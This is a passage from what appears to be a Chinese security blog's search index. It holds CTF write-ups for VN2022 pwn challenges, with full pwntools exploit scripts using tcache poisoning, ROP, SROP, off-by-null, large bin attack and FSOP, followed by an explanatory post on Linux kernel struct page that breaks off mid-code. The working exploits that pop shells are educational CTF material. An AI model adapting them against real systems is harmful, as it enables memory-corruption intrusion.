r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def edit(id, content):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))create(0x50)  # 0delete(0)delete(0)show(0)tcache_struct_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))-0x250print(hex(tcache_struct_addr))create(0x50)  # 1edit(1, p64(tcache_struct_addr))# delete(2)create(0x50)  # 2create(0x50)  # 3  tcache_structedit(3, b&#x27;a&#x27;*0x28)delete(3)show(3)main_arena_96 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc_addr = libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4f322create(0x60)  # 4edit(4, b&#x27;\\x00&#x27;*0x40+p64(0)*2+p64(malloc_hook-8))create(0x30)  # 5edit(5, p64(one_gadget)+p64(realloc_addr+8))# gdb.attach(r)create(1)r.interactive()# flag:flag&#123;ce977aa0-80c8-48c6-a1d0-24ec4f55ce17&#125;\n\nwarmup题目很简单，不过需要gdb调试一下，调试一下会发现，第一个不存在栈溢出的函数和第二个存在栈溢出的函数的两个栈地址是相邻的。\nexpfrom pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 26531)#r = process(&#x27;./vn_pwn_warmup&#x27;)elf = ELF(&#x27;./vn_pwn_warmup&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(&#x27;gift: &#x27;)puts_addr = int(r.recvline()[:-1], 16)libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]pop_rdi_ret = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]payload = b&#x27;a&#x27;*0x70 + b&#x27;b&#x27;*0x8payload += p64(pop_rdi_ret)payload2 = p64(0) + p64(pop_rsi_ret) + p64(free_hook) + \\    p64(pop_rdx_ret) + p64(4) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + \\    p64(pop_rsi_ret) + p64(0) + p64(open_addr)payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + \\    p64(free_hook) + p64(pop_rdx_ret) + p64(100) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)r.recvuntil(&#x27;something: &#x27;)r.send(payload2)r.recvuntil(&#x27;name?&#x27;)r.send(payload)r.send(&#x27;flag&#x27;)r.interactive()# flag:flag&#123;963b2367-7364-44bf-8352-2c5552e4219e&#125;\n\nbabybabypwn这一个是最头疼的，不过我写的exp后面改得和其他wp一样也是打不通就很烦。\n这道题使用的是SROP攻击，原理我还没怎么看懂，不过做题我应该能做出来，所以我就放个exp，后面会把SROP的原理和相关例题在做一篇博客。\nexpfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# r = process(&#x27;./vn_pwn_babybabypwn_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29297)elf = ELF(&#x27;./vn_pwn_babybabypwn_1&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(b&#x27;Here is my gift: 0x&#x27;)puts_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), 16)libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]info(hex(libc_base))libc_bss = libc.bss()+libc_base+0x100pop_rdi = libc_base + 0x21102pop_rsi = libc_base + 0x202e8pop_rdx = libc_base + 0x1b92read_addr = libc.symbols[&#x27;read&#x27;]+libc_baseopen_addr = libc.symbols[&#x27;open&#x27;]+libc_basewrite_addr = libc.symbols[&#x27;write&#x27;]+libc_baser.recvuntil(b&#x27;Please input magic message: &#x27;)frame = SigreturnFrame()frame.rdi = 0frame.rsi = libc_bssframe.rdx = 0x100frame.rip = read_addrframe.rsp = libc_bssr.send(bytes(str(frame), encoding=&#x27;utf8&#x27;)[8:])flag_addr = libc_bss+0x98payload = p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(write_addr)payload += b&#x27;flag\\x00&#x27;r.send(payload)r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"VN2022复现_FShuiMaster","url":"/2022/02/22/VN2022%E5%A4%8D%E7%8E%B0-FShuiMaster/","content":"这道题目只有三解，但是确实是有难度，这里我只写上思路在这周内补上以上知识点的文章。\n首先题目的保护是全开的，在edit内存在明显的off by null，然后在increase函数里限制了chunk的大小必须为large chunk\n__int64 __fastcall get_Input(__int64 a1, unsigned __int64 a2)&#123;  char buf; // [rsp+1Fh] [rbp-11h] BYREF  unsigned __int64 i; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  for ( i = 0LL; i &lt; a2; ++i )  &#123;    if ( read(0, &amp;buf, 1uLL) &lt;= 0 )      exit(0);    if ( buf == 10 )    &#123;      *(a1 + i) = 0;      break;    &#125;    *(i + a1) = buf;  &#125;  if ( i == a2 )    *(a1 + a2) = 0;  return 0LL;&#125;\n\n第一步就是利用off by null来leak libc。\ncreate(0x440, b&#x27;&#x27;)  # 0create(0x448, b&#x27;&#x27;)  # 1create(0x4f0, b&#x27;&#x27;)  # 2create(0x440, b&#x27;&#x27;)  # 3delete(0)edit(1, b&#x27;a&#x27;*0x440+p64(0x8a0))delete(2)create(0x440, b&#x27;&#x27;)  # 4show(1)r.recvline()main_arena_96 = u64(r.recvuntil(    b&#x27;\\n\\nOne: increase a page of U book&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]\n\n因为我是复现所以我的思路是根据其他exp的，其实按照我的写法是没必要泄漏heap的地址的，但是我写了还是贴出来吧。\ncreate(0x448, b&#x27;&#x27;)  # 5 1create(0x448, b&#x27;&#x27;)  # 6create(0x440, b&#x27;&#x27;)  # 7create(0x448, b&#x27;&#x27;)  # 8create(0x450, b&#x27;&#x27;)  # 9create(0x440, b&#x27;&#x27;)  # 10delete(7)delete(9)create(0x440, b&#x27;a&#x27;*7)  # 11show(11)r.recvuntil(b&#x27;a&#x27;*7+b&#x27;\\n&#x27;)heap_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(&#x27;heap_addr=&gt;&#x27;, hex(heap_addr))\n\n后面就是FSOP的内容了，在glibc2.24及以后，添加了vtable check的保护措施，所以不能直接修改vtable的值(会有专门解释FSOP的文章)。\n又因为FILE结构体其实是用_IO_list_all来维护的(其中储存着_IO_2_1_stderr_的地址)，所以我们这里只需要修改其中的值到一个chunk，然后将vtable的值换为_IO_str_jumps-8，并且根据要求构造FILE结构体就好。\n最后使用large bin attack(也会有专门解释各glibc版本下的利用方式)。将_IO_list_all改为堆地址然后将相应的堆内容换为构造的FILE结构体。\nfrom pwn import *elf = ELF(&#x27;./FShuiMaster&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)r = process(&#x27;./FShuiMaster&#x27;)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Number of words?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;please input U character&#x27;)    r.sendline(content)def edit(id, content):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;please input the page U want 2 change&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Now Change U this page : &#x27;)    r.sendline(content)def delete(id):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;please Input the page U want 2 tear off&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;please Input The page U want 2 scan&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def pack_file(_IO_read_base=0, _IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _mode=0, vtable=0):    IO_FILE = p64(0)*3+p64(_IO_read_base) + \\        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(0)+p64(_IO_buf_base)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&#x27;Please Write U Name on the Book\\n&#x27;)r.sendline(b&#x27;196082&#x27;)create(0x440, b&#x27;&#x27;)  # 0create(0x448, b&#x27;&#x27;)  # 1create(0x4f0, b&#x27;&#x27;)  # 2create(0x440, b&#x27;&#x27;)  # 3delete(0)edit(1, b&#x27;a&#x27;*0x440+p64(0x8a0))delete(2)create(0x440, b&#x27;&#x27;)  # 4show(1)r.recvline()main_arena_96 = u64(r.recvuntil(    b&#x27;\\n\\nOne: increase a page of U book&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]create(0x448, b&#x27;&#x27;)  # 5 1create(0x448, b&#x27;&#x27;)  # 6create(0x440, b&#x27;&#x27;)  # 7create(0x448, b&#x27;&#x27;)  # 8create(0x450, b&#x27;&#x27;)  # 9create(0x440, b&#x27;&#x27;)  # 10delete(7)delete(9)create(0x440, b&#x27;a&#x27;*7)  # 11show(11)r.recvuntil(b&#x27;a&#x27;*7+b&#x27;\\n&#x27;)heap_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(&#x27;heap_addr=&gt;&#x27;, hex(heap_addr))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))IO_list_all = libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]IO_str_jumps = libc_base + 0x3e8360print(&#x27;_IO_list_all=&gt;&#x27;, hex(IO_list_all))print(&#x27;_IO_str_jumps=&gt;&#x27;, hex(IO_str_jumps))file_struct = pack_file(IO_list_all, 0, 1, bin_sh_addr, 0, IO_str_jumps-8)file_struct += p64(0)+p64(system_addr)create(0x440, b&#x27;&#x27;)  # 12create(0x440, b&#x27;&#x27;)  # 13create(0x458, b&#x27;&#x27;)  # 14create(0x4f0, b&#x27;&#x27;)  # 15create(0x440, b&#x27;&#x27;)  # 16delete(13)edit(14, b&#x27;a&#x27;*0x450+p64(0x8b0))delete(15)create(0x440, b&#x27;&#x27;)  # 17create(0x458, b&#x27;&#x27;)  # 18 14delete(1)create(0x4f0, b&#x27;&#x27;)  # 19create(0x470, b&#x27;&#x27;)  # 20delete(18)edit(5, p64(main_arena_96)+p64(IO_list_all-0x10))create(0x500, b&#x27;&#x27;)edit(14, file_struct[0x10:])r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)r.sendline(b&#x27;5&#x27;)# gdb.attach(r)r.interactive()\n\n其他师傅只使用一次off by null，我一直卡在最后构造结构体的位置，换换脑子过后想到了用两次off by null来解决这个问题。\n","categories":["比赛复现"],"tags":["FSOP","off bu null","large bin attack"]},{"title":"Kernel内存管理","url":"/2024/01/24/Kernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","content":"前言其实这一篇打算的是写syz-fuzzer部分的源码分析或者是Linux Rootkit这两篇中的一篇，但是在前一篇文章中较为详细的分析了slub的分配流程，加上也有几位师傅说我的博客缺少基础知识，这也就让我想要不把也这篇文章给写了。这里说一下为什么我不愿意写这些基础的原因，在学校期间我不愿意写的主要原因是我想要不断的学习新东西（可以看到我前面玩过什么qemu，chrome之类的），随后会过一遍基础但是写下来就会有点费力不讨好的感觉。实习之后为什么不写的主要原因是，写基础是不能当作这一周干的事写进周报的，可以看到在上班期间我复现了很多CVE其实在那么多篇中也穿插了许多的基础知识，对资本家的无声抵抗了属于是。\n当然，虽然前面理由那么多但是最严重的一个问题还是，没人看我博客😭，这也是让我一直犯懒的原因（不过留着自己看也是很好的）。\n\nstruct page在前面的很多文章中都提到过page结构体，但是并没有拿出来详细解释过，这里也详细的阐述一下吧。在 向pipe_buffer说yes！ 文章中我们是使用off by null导致两个pipe_buffer-&gt;page指针指向了同一个page结构体，而page结构体在 Linux Kernel 中用于表示一个物理页框同样每个物理页框也会对应一个page结构体，正是因为前面的对应关系存在我们才能够让后面的pipe_buffer结构体去占领对应的物理页框。\nstruct page &#123;\tunsigned long flags;\t\t/* Atomic flags, some possibly\t\t\t\t\t * updated asynchronously */\t/*\t * Five words (20/40 bytes) are available in this union.\t * WARNING: bit 0 of the first word is used for PageTail(). That\t * means the other users of this union MUST NOT use the bit to\t * avoid collision and false-positive PageTail().\t */\tunion &#123;\t\tstruct &#123;\t/* Page cache and anonymous pages */\t\t\t/**\t\t\t * @lru: Pageout list, eg. active_list protected by\t\t\t * lruvec-&gt;lru_lock.  Sometimes used as a generic list\t\t\t * by the page owner.\t\t\t */\t\t\tunion &#123;\t\t\t\tstruct list_head lru;\t\t\t\t/* Or, for the Unevictable &quot;LRU list&quot; slot */\t\t\t\tstruct &#123;\t\t\t\t\t/* Always even, to negate PageTail */\t\t\t\t\tvoid *__filler;\t\t\t\t\t/* Count page&#x27;s or folio&#x27;s mlocks */\t\t\t\t\tunsigned int mlock_count;\t\t\t\t&#125;;\t\t\t\t/* Or, free page */\t\t\t\tstruct list_head buddy_list;\t\t\t\tstruct list_head pcp_list;\t\t\t&#125;;\t\t\t/* See page-flags.h for PAGE_MAPPING_FLAGS */\t\t\tstruct address_space *mapping;\t\t\tunion &#123;\t\t\t\tpgoff_t index;\t\t/* Our offset within mapping. */\t\t\t\tunsigned long share;\t/* share count for fsdax */\t\t\t&#125;;\t\t\t/**\t\t\t * @private: Mapping-private opaque data.\t\t\t * Usually used for buffer_heads if PagePrivate.\t\t\t * Used for swp_entry_t if PageSwapCache.\t\t\t * Indicates order in the buddy system if PageBuddy.\t\t\t */\t\t\tunsigned long private;\t\t&#125;;\t\tstruct &#123;\t/* page_pool used by netstack */\t\t\t/**\t\t\t * @pp_magic: magic value to avoid recycling non\t\t\t * page_pool allocated pages.\t\t\t */\t\t\tunsigned long pp_magic;\t\t\tstruct page_pool *pp;\t\t\tunsigned long _pp_mapping_pad;\t\t\tunsigned long dma_addr;\t\t\tunion &#123;\t\t\t\t/**\t\t\t\t * dma_addr_upper: might require a 64-bit\t\t\t\t * value on 32-bit architectures.\t\t\t\t */\t\t\t\tunsigned long dma_addr_upper;\t\t\t\t/**\t\t\t\t * For frag page support, not supported in\t\t\t\t * 32-bit architectures with 64-bit DMA.\t\t\t\t */\t\t\t\tatomic_long_t pp_frag_count;\t\t\t&#125;;\t\t&#125;;\t\tstruct &#123;\t/* Tail pages of compound page */\t\t\tunsigned long compound_head;\t/* Bit zero is set */\t\t&#125;;\t\tstruct &#123;\t/* ZONE_DEVICE pages */\t\t\t/** @pgmap: Points to the hosting device page map. */\t\t\tstruct dev_pagemap *pgmap;\t\t\tvoid *zone_device_data;\t\t\t/*\t\t\t * ZONE_DEVICE private pages are counted as being\t\t\t * mapped so the next 3 words hold the mapping, index,\t\t\t * and private fields from the source anonymous or\t\t\t * page cache page while the page is migrated to device\t\t\t * private memory.\t\t\t * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also\t\t\t * use the mapping, index, and private fields when\t\t\t * pmem backed DAX files are mapped.\t\t\t */\t\t&#125;;\t\t/** @rcu_head: You can use this to free a page by RCU. */\t\tstruct rcu_head rcu_head;\t&#125;;\tunion &#123;\t\t/* This union is 4 bytes in size. */\t\t/*\t\t * If the page can be mapped to userspace, encodes the number\t\t * of times this page is referenced by a page table.\t\t */\t\tatomic_t _mapcount;\t\t/*\t\t * If the page is neither PageSlab nor mappable to userspace,\t\t * the value stored here may help determine what this page\t\t * is used for.  See page-flags.h for a list of page types\t\t * which are currently stored here.\t\t */\t\tunsigned int page_type;\t&#125;;\t/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */\tatomic_t _refcount;#ifdef CONFIG_MEMCG\tunsigned long memcg_data;#endif\t/*\t * On machines where all RAM is mapped into kernel address space,\t * we can simply calculate the virtual address. On machines with\t * highmem some memory is mapped into kernel virtual memory\t * dynamically, so we need a place to store that address.\t * Note that this field could be 16 bits on x86 ... ;)\t *\t * Architectures with slow multiplication can define\t * WANT_PAGE_VIRTUAL in asm/page.h\t */#if defined(WANT_PAGE_VIRTUAL)\tvoid *virtual;\t\t\t/* Kernel virtual address (NULL if\t\t\t\t\t   not kmapped, ie. highmem) */#endif /* WANT_PAGE_VIRTUAL */#ifdef CONFIG_KMSAN\t/*\t * KMSAN metadata for this page:\t *  - shadow page: every bit indicates whether the corresponding\t *    bit of the original page is initialized (0) or not (1);\t *  - origin page: every 4 bytes contain an id of the stack trace\t *    where the uninitialized value was created.\t */\tstruct page *kmsan_shadow;\tstruct page *kmsan_origin;#endif#ifdef LAST_CPUPID_NOT_IN_PAGE_FLAGS\tint _last_cpupid;#endif&#125; _struct_page_alignment;\n\n在内核中page结构体的定义如上，这里不会将全部成员的含义进行解释只会解释较为重要或是后文中需要的。\nflags：标志位这个成员的含义很明显，用于表示该页处于什么样的状态\nenum pageflags &#123;\tPG_locked,\t\t/* Page is locked. Don&#x27;t touch. */\tPG_writeback,\t\t/* Page is under writeback */\tPG_referenced,\tPG_uptodate,\tPG_dirty,\tPG_lru,\tPG_head,\t\t/* Must be in bit 6 */\tPG_waiters,\t\t/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */\tPG_active,\tPG_workingset,\tPG_error,\tPG_slab,\tPG_owner_priv_1,\t/* Owner use. If pagecache, fs may use*/\tPG_arch_1,\tPG_reserved,\tPG_private,\t\t/* If pagecache, has fs-private data */\tPG_private_2,\t\t/* If pagecache, has fs aux data */\tPG_mappedtodisk,\t/* Has blocks allocated on-disk */\tPG_reclaim,\t\t/* To be reclaimed asap */\tPG_swapbacked,\t\t/* Page is backed by RAM/swap */\tPG_unevictable,\t\t/* Page is &quot;unevictable&quot;  */#ifdef CONFIG_MMU\tPG_mlocked,\t\t/* Page is vma mlocked */#endif#ifdef CONFIG_ARCH_USES_PG_UNCACHED\tPG_uncached,\t\t/* Page has been mapped as uncached */#endif#ifdef CONFIG_MEMORY_FAILURE\tPG_hwpoison,\t\t/* hardware poisoned page. Don&#x27;t touch */#endif#if defined(CONFIG_PAGE_IDLE_FLAG) &amp;&amp; defined(CONFIG_64BIT)\tPG_young,\tPG_idle,#endif#ifdef CONFIG_ARCH_USES_PG_ARCH_X\tPG_arch_2,\tPG_arch_3,#endif\t__NR_PAGEFLAGS,\tPG_readahead = PG_reclaim,\t/*\t * Depending on the way an anonymous folio can be mapped into a page\t * table (e.g., single PMD/PUD/CONT of the head page vs. PTE-mapped\t * THP), PG_anon_exclusive may be set only for the head page or for\t * tail pages of an anonymous folio. For now, we only expect it to be\t * set on tail pages for PTE-mapped THP.\t */\tPG_anon_exclusive = PG_mappedtodisk,\t/* Filesystems */\tPG_checked = PG_owner_priv_1,\t/* SwapBacked */\tPG_swapcache = PG_owner_priv_1,\t/* Swap page: swp_entry_t in private */\t/* Two page bits are conscripted by FS-Cache to maintain local caching\t * state.  These bits are set on pages belonging to the netfs&#x27;s inodes\t * when those inodes are being locally cached.\t */\tPG_fscache = PG_private_2,\t/* page backed by cache */\t/* XEN */\t/* Pinned in Xen as a read-only pagetable page. */\tPG_pinned = PG_owner_priv_1,\t/* Pinned as part of domain save (see xen_mm_pin_all()). */\tPG_savepinned = PG_dirty,\t/* Has a grant mapping of another (foreign) domain&#x27;s page. */\tPG_foreign = PG_owner_priv_1,\t/* Remapped by swiotlb-xen. */\tPG_xen_remapped = PG_owner_priv_1,\t/* non-lru isolated movable page */\tPG_isolated = PG_reclaim,\t/* Only valid for buddy pages. Used to track pages that are reported */\tPG_reported = PG_uptodate,#ifdef CONFIG_MEMORY_HOTPLUG\t/* For self-hosted memmap pages */\tPG_vmemmap_self_hosted = PG_owner_priv_1,#endif\t/*\t * Flags only valid for compound pages.  Stored in first tail page&#x27;s\t * flags word.  Cannot use the first 8 flags or any flag marked as\t * PF_ANY.\t */\t/* At least one page in this folio has the hwpoison flag set */\tPG_has_hwpoisoned = PG_error,\tPG_hugetlb = PG_active,\tPG_large_rmappable = PG_workingset, /* anon or file-backed */&#125;;\n\n上面的枚举类型变量就对应了一个页的不同状态。\n\nPG_locked：表示该页已被上锁，说明此时该页正在被使用\nPG_referenced：该页刚刚被访问过，该标志位与 PG_reclaim 标志位共同被用于匿名与文件备份缓存的页面回收\nPG_uptodate：该页处在最新状态，当对该页完成一次读取时，该页便变更为 up-to-date 状态，除非发生了磁盘 IO 错误\nPG_dirty：该页为脏页，即该页的内容已被修改，应当尽快将内容写回磁盘上\nPG_lru：该页处在一个 LRU 链表上\nPG_active：该页面位于活跃 lru 链表中\nPG_workingset：该页位于某个进程的工作集（即一个进程同时使用的内存数量，例如一个进程可能分配了114514MB内存，但是在同一时刻只使用其中的1919MB，这就是工作集）中\nPG_waiters：有进程在等待该页面\nPG_error：该页在 I/O 过程中出现了差错\nPG_slab：该页由 slab 使用\nPG_owner_priv_1：该页由其所有者使用，若是作为 pagecache 页面，则可能是被文件系统使用\nPG_arch_1：该标志位与体系结构相关联\nPG_reserved：该页被保留，不能够被 swap out（内核会将不活跃的页交换到磁盘上）\nPG_private ：该页拥有私有数据（private 字段）\nPG_writeback：该页正在被写到磁盘上\nPG_head：在内核中有时需要将多个页组成一个 compound pages，而设置该状态时表明该页是 compound pages 的第一个页\nPG_mappedtodisk：该页被映射到硬盘中\nPG_reclaim：该页可以被回收\nPG_swapbacked：该页的后备存储器为 swap/RAM\nPG_unevictable：该页不可被回收（被锁），且会出现在 LRU_UNEVICTABLE 链表中\nPG_mlocked：该页被对应的 vma 上锁（通常是系统调用 mlock）\nPG_uncached：该页被设置为不可缓存\nPG_hwpoison：硬件相关的标志位\nPG_arch_2：64位下的体系结构相关标志位\n\nflags标志位还存在复用的情况\n/* * page-&gt;flags layout: * * There are five possibilities for how page-&gt;flags get laid out.  The first * pair is for the normal case without sparsemem. The second pair is for * sparsemem when there is plenty of space for node and section information. * The last is when there is insufficient space in page-&gt;flags and a separate * lookup is necessary. * * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS | *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS | * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS | *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS | * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS | */\n\nflags字段会为了节省内存与其他结构共用空间，具体划分形式与内核配置的内存模型有关，可以看到上面讲起话氛围了五种，其实是三大种。\n第一种：非sparse内存模式\n\n如上图所示，低位用作该 page 的 flag，高位分别标识其归属的 zone， node id（非 NUMA 系统中为0），中间剩余的位保留。\n第二种：sparse内存模式\n\n如上图所示，相比起第一种形式多了一个 SECTION 字段标识其归属的 mem_section。\n第三种：没有Node的sparse内存模式\n即在第二种的基础上去掉node字段。这一模式主要适用于非NUMA系统，在这种情况下取消了NODE结构。\nlru：链表节点lru大家应该都是较为熟悉的，在操作系统课上学习过页面置换算法。\n\n如上图所示，page结构体由lru组织成链表。\nslab：相关结构体在低版本的page结构体中专门有一个匿名变量用来存放于slab相关的成员的\nstruct &#123;\t/* slab, slob and slub */\t\t\tunion &#123;\t\t\t\tstruct list_head slab_list;\t\t\t\tstruct &#123;\t/* Partial pages */\t\t\t\t\tstruct page *next;#ifdef CONFIG_64BIT\t\t\t\t\tint pages;\t/* Nr of pages left */\t\t\t\t\tint pobjects;\t/* Approximate count */#else\t\t\t\t\tshort int pages;\t\t\t\t\tshort int pobjects;#endif\t\t\t\t&#125;;\t\t\t&#125;;\t\t\tstruct kmem_cache *slab_cache; /* not slob */\t\t\t/* Double-word boundary */\t\t\tvoid *freelist;\t\t/* first free object */\t\t\tunion &#123;\t\t\t\tvoid *s_mem;\t/* slab: first object */\t\t\t\tunsigned long counters;\t\t/* SLUB */\t\t\t\tstruct &#123;\t\t\t/* SLUB */\t\t\t\t\tunsigned inuse:16;\t\t\t\t\tunsigned objects:15;\t\t\t\t\tunsigned frozen:1;\t\t\t\t&#125;;\t\t\t&#125;;\t\t&#125;;\n\n关于slab的内容就不多赘述了，可以看前一篇文章 Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique 。\n_mapcount：映射计数记录该页被页表映射的次数，每个进程有其独立的页表，故可以理解为该值记录了该页被多少个进程共享，其初始值为 -1。由于这是一个联合体，若是该页没有被映射到用户空间，则为 page_type 字段\n_refcount：引用计数引用计数相比应该都很熟悉的，该字段用作该页面在内核中的引用计数器，初始时页面为空闲状态，该计数器为 0，每当该页面被分配引用时计数器会 + 1，被其他页面进行引用时也会 + 1。当引用计数器为 0 时表示该页面为空闲状态或即将要被释放，若大于 0 则表示正在被使用，暂时不会释放。\n内核中提供了两个函数 get_page()与 put_page() 来进行引用计数的增减\nstatic inline void put_page(struct page *page)&#123;\tstruct folio *folio = page_folio(page);\t/*\t * For some devmap managed pages we need to catch refcount transition\t * from 2 to 1:\t */\tif (put_devmap_managed_page(&amp;folio-&gt;page))\t\treturn;\tfolio_put(folio);&#125;\n\n会调用folio_put函数来检测是否引用计数为0然后是否释放该页。\nvirtual：虚拟地址该字段为该物理页框对应的的虚拟地址\n\n每一个 struct page 对应一个物理页框，那么这个 virtual 字段其实就是上图的反向映射。\n不同内存模型下的struct page存储方式\nLinux 提供了上图中的三种内存模型，内存模型在编译时就会被确定下来，目前最为常用的是Sparse Memory模型。\nFlat Memory平滑内存模型。物理内存地址连续，有一个全局变量 mem_map 由一个大的struct page数组直接对应现有的物理内存\nDiscontiguous Memory非连续性内存模型，对于每一段连续的物理内存，都有一个 pglist_data 结构体进行对应，其成员 node_mem_map 为一个struct page指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存。有一个全局变量 node_data 为一个pglist_data指针数组，其中存放着指向每一个pglist_data的指针，该数组的大小为 MAX_NUMNODES。主要针对内存中存在空洞的情况。\nSparse Memory离散内存模型，在一个mem_section结构体中存在一个 section_mem_map 成员指向一个struct page数组对应一段连续的物理内存，即将内存按照 section 为单位进行分段。\nstruct mem_section &#123;\t/*\t * This is, logically, a pointer to an array of struct\t * pages.  However, it is stored with some other magic.\t * (see sparse.c::sparse_init_one_section())\t *\t * Additionally during early boot we encode node id of\t * the location of the section here to guide allocation.\t * (see sparse.c::memory_present())\t *\t * Making it a UL at least makes someone do a cast\t * before using it wrong.\t */\tunsigned long section_mem_map;\tstruct mem_section_usage *usage;#ifdef CONFIG_PAGE_EXTENSION\t/*\t * If SPARSEMEM, pgdat doesn&#x27;t have page_ext pointer. We use\t * section. (see page_ext.h about this.)\t */\tstruct page_ext *page_ext;\tunsigned long pad;#endif\t/*\t * WARNING: mem_section must be a power-of-2 in size for the\t * calculation and use of SECTION_ROOT_MASK to make sense.\t */&#125;;\n\n存在一个全局指针数组 mem_section （与结构体同名）存放所有的 mem_section 指针，指向理论上支持的内存空间，每个 section 对应的物理内存不一定存在，若不存在则此时该 section 的指针为 NULL。\n#ifdef CONFIG_SPARSEMEM_EXTREMEstruct mem_section **mem_section;#elsestruct mem_section 